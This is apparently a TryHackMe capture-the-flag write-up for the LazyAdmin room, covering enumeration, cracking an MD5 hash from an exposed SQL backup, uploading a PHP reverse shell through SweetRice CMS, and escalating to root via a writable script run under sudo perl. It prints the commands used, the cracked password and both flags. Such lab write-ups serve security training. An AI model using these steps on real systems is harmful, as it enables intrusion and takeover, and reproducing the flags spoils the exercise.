# LazyAdmin — TryHackMe

**Date:** June 2026  
**Difficulty:** Easy  
**Category:** Web, File Upload, Reverse Shell, Privilege Escalation  
**Status:** ✅ Completed  

---

# 🔍 Summary

LazyAdmin is an easy TryHackMe room focused on web enumeration, credential discovery, file upload exploitation, reverse shells, and privilege escalation. The objective was to discover sensitive files exposed on the web server, recover administrator credentials, gain remote code execution through the CMS, and escalate privileges to root.

---

# 🛠️ Tools Used

- Nmap
- Gobuster
- Hash Identifier
- Hashcat
- PHP Reverse Shell
- Netcat
- SSH
- GTFOBins

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```

<img width="846" height="684" alt="Screenshot 2026-06-02 205422" src="https://github.com/user-attachments/assets/99c898a4-a394-4d34-b70f-901aacdfefaf" />


### Findings

| Port | Service |
|--------|---------|
| 22 | SSH |
| 80 | HTTP |

The website initially displayed the default Apache page.

<img width="2361" height="1325" alt="Screenshot 2026-06-02 205513" src="https://github.com/user-attachments/assets/769b4da9-57e5-4c41-9b89-dd5dcb681e1e" />


---

## Directory Enumeration

Using Gobuster:

```bash
gobuster dir -u http://MACHINE_IP \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 200
```

<img width="1132" height="838" alt="Screenshot 2026-06-02 205813" src="https://github.com/user-attachments/assets/5e852959-9181-4c60-887b-f1e8ace30900" />


A directory named:

```text
/content
```

was discovered.

Further enumeration revealed:

```text
/content/as
/content/inc
/content/themes
/content/attachment
```

<img width="1007" height="1156" alt="Screenshot 2026-06-02 210035" src="https://github.com/user-attachments/assets/a78adb63-3ad3-4c66-b9f9-f2f71ad572d4" />
<img width="706" height="525" alt="Screenshot 2026-06-02 210238" src="https://github.com/user-attachments/assets/30048563-8446-454e-9e42-f0f6bc4e3551" />


---

## Discovering SweetRice CMS

Browsing to:

```text
/content/as
```

revealed the SweetRice administrator login portal.

<img width="2366" height="1328" alt="Screenshot 2026-06-02 210346" src="https://github.com/user-attachments/assets/9ae75976-c07b-4957-b714-b4a69b031e5c" />


---

# 🔓 Exploitation

## Database Backup Disclosure

While enumerating the `/content/inc` directory, I discovered:

```text
/content/inc/mysql_backup
```

<img width="2357" height="1320" alt="Screenshot 2026-06-02 210423" src="https://github.com/user-attachments/assets/7cb8baf1-f917-4b0e-83fe-3305e19279b7" />


A SQL backup file was publicly accessible and downloaded.

Opening the backup revealed administrator account information.

<img width="2366" height="1360" alt="Screenshot 2026-06-02 210515" src="https://github.com/user-attachments/assets/82bfc039-812e-431c-bb5c-5c516c59a30f" />


### Extracted Hash

```text
42f749ade7f9e195bf475f37a44cafcb
```

---

## Hash Identification

Using:

```bash
hash-identifier HASH
```

<img width="668" height="1017" alt="Screenshot 2026-06-02 210559" src="https://github.com/user-attachments/assets/c794302b-f34e-4cd1-a9bd-abf810a8c7c1" />


The hash was identified as MD5.

---

## Password Cracking

Using Hashcat:

```bash
hashcat -m 0 HASH \
/usr/share/wordlists/rockyou.txt
```

<img width="1119" height="1002" alt="Screenshot 2026-06-02 210734" src="https://github.com/user-attachments/assets/ac6b6ba5-493f-4a2e-ad0c-8e2f5b54f7e6" />


### Password Recovered

```text
Password123
```

---

## Admin Login

Using the recovered credentials, I successfully authenticated to the SweetRice administration portal.

<img width="2363" height="1330" alt="Screenshot 2026-06-02 210918" src="https://github.com/user-attachments/assets/c0387d47-36e1-410b-8193-c2166b03c00d" />


---

## File Upload Vulnerability

I downloaded the PHP reverse shell:

```text
https://github.com/pentestmonkey/php-reverse-shell
```

<img width="2365" height="1316" alt="Screenshot 2026-06-02 211114" src="https://github.com/user-attachments/assets/8b9121f5-0bbc-4cdc-955a-fe4b18cf88b4" />


Inside the SweetRice administration panel, I located the Ads feature which allowed arbitrary PHP code uploads.

<img width="2369" height="1325" alt="Screenshot 2026-06-02 213052" src="https://github.com/user-attachments/assets/dc6be9f6-8d2e-48bb-9152-42c982fdf54e" />


After uploading the PHP reverse shell, the file became accessible through:

```text
/content/inc/ads/shell.php
```

<img width="2359" height="1330" alt="Screenshot 2026-06-02 213153" src="https://github.com/user-attachments/assets/36b4cc41-1aaf-4958-ac67-a378ce698a52" />


---

## Reverse Shell

Started a Netcat listener:

```bash
nc -lvnp 1234
```

Then triggered the uploaded shell through the browser.

A reverse shell connection was received.

<img width="955" height="1011" alt="Screenshot 2026-06-02 222248" src="https://github.com/user-attachments/assets/3883dc4d-9130-4461-b487-6a76ce417b10" />


### User Flag

Enumerating the system:

```bash
cd /home/itguy
cat user.txt
```

Output:

```text
THM{63e5bce9271952aad1113b6f1ac28a07}
```

---

# ⬆️ Privilege Escalation

## Sudo Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

<img width="1002" height="544" alt="Screenshot 2026-06-02 223438" src="https://github.com/user-attachments/assets/fd0a9dc1-09fc-45c3-a1de-0ce913ce9703" />


---

## Analyzing backup.pl

Reviewing the script revealed:

```perl
system("sh", "/etc/copy.sh");
```

The script executed a writable shell script as root.

I modified:

```bash
/etc/copy.sh
```

to contain a reverse shell payload.

---

## GTFOBins Research

I referenced GTFOBins for Perl privilege escalation techniques.

<img width="2359" height="1217" alt="Screenshot 2026-06-02 222413" src="https://github.com/user-attachments/assets/a138b603-1dc1-4841-a22f-7ea3aaeeae1a" />


---

## Root Shell

Started another Netcat listener:

```bash
nc -lvnp 5555
```

Executed:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

A root reverse shell was received.

<img width="677" height="647" alt="Screenshot 2026-06-02 223507" src="https://github.com/user-attachments/assets/63b6f1a5-8f4b-4718-a10d-fc386a775ec4" />


Verifying privileges:

```bash
whoami
```

Output:

```text
root
```

---

# 🚩 Root Flag

Reading the root flag:

```bash
cd /root
cat root.txt
```

Output:

```text
THM{6637f41d0177b6f37cb20d775124699f}
```

---
<img width="1693" height="960" alt="Screenshot 2026-06-02 223518" src="https://github.com/user-attachments/assets/60e310af-eac0-490b-be92-c29594aa091d" />

# 📚 Lessons Learned

- Practiced web directory enumeration
- Identified exposed backup files
- Recovered credentials from SQL backups
- Cracked MD5 password hashes with Hashcat
- Exploited CMS administrative functionality for code execution
- Uploaded and executed PHP reverse shells
- Performed privilege escalation through insecure sudo configurations
- Analyzed custom Perl scripts for escalation vectors

---
